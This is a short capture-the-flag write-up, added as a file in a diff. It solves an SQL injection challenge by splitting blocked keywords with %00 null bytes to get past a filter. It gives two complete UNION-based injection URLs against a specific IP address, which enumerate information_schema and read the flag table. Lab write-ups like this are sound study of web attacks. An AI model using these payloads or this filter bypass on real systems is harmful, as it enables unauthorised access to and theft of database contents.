@@ -1,0 +1,15 @@
+This is an SQL injection challenge. There is hint that some keywords are blocked.  
+
+After several tries, I found that some SQL keywords like 'Select', 'from' and 'where' are blocked. 
+
+Use 'Order By' trick to get the number of rows: 3
+
+Then try to bypass WAF use different ways. Finally I find using '%00' to brake the keywords works. 
+
+http://202.120.7.203/index.php?id=8%20union%20Sel%00ect%201,table_name,table_schema%20fr%00om%20information_schema.tables%20wh%00ere%20table_schema!=%27information_schema%27--
+Get table name 'flag'
+
+http://202.120.7.203/index.php?id=8%20union%20Sel%00ect%201,2,flag%20fr%00om%20flag--
+Get flag.
+
+flag{W4f_bY_paSS_f0R_CI}
